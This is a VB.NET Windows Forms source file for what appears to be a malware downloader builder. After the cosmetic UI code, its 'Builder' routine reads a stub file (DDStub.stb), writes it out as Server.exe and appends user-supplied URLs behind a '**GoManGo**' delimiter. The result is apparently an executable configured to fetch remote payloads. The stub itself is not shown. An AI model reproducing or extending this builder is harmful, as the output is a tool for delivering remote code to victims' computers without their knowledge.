Imports System.IO
Public Class Form1

#Region "Basics"
#Region "Label Stuff"
    Private Sub Label1_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label1.MouseHover
        Label1.ForeColor = Color.Red
    End Sub

    Private Sub Label2_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label2.MouseHover
        Label2.ForeColor = Color.Red
    End Sub

    Private Sub Label1_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label1.MouseLeave
        Label1.ForeColor = Color.Gainsboro
    End Sub

    Private Sub Label2_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label2.MouseLeave
        Label2.ForeColor = Color.Gainsboro
    End Sub
    Private Sub Label3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label3.Click
        Me.Close()
    End Sub
    Sub label3_hover() Handles Label3.MouseHover
        Label3.ForeColor = Color.Red
    End Sub
    Sub label3_mouseleave() Handles Label3.MouseLeave
        Label3.ForeColor = Color.Gainsboro
    End Sub
    Private Sub Label1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label1.Click
        addlv()
    End Sub

#End Region
#Region "Contex Menu"

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    Private Sub RemoveAllToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveAllToolStripMenuItem.Click
        ListView1.Clear()
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveToolStripMenuItem.Click
        For Each lvItem As ListViewItem In ListView1.SelectedItems
            lvItem.Remove()
        Next
    End Sub

#End Region
    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox1.TextChanged
        If TextBox1.Text.Length <= 1 Then
            Label1.Enabled = False
        Else : Label1.Enabled = True
        End If
    End Sub
    Sub addlv()
        ListView1.Items.Add(TextBox1.Text)
        TextBox1.Text = ""
    End Sub
#End Region
#Region "Builder"
    Sub build() Handles Label2.Click
        Dim stub, urls As String
        Const FileSplit = "**GoManGo**"
        FileOpen(3, Application.StartupPath & "\DDStub.stb", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(3))
        FileGet(3, stub)
        FileClose(3)
        If File.Exists(Application.StartupPath & "\server.exe") Then File.Delete(Application.StartupPath & "\Server.exe")
        FileOpen(3, Application.StartupPath & "\Server.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, stub)
        For I = 0 To ListView1.Items.Count - 1
            urls = ListView1.Items(I).Text
            FilePut(3, FileSplit & urls)
        Next
        FileClose(3)
        MsgBox("Done!")
        Me.Close()
    End Sub
#End Region

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        TextBox1.BackColor = Color.Black
        ListView1.BackColor = Color.Black
    End Sub
End Class
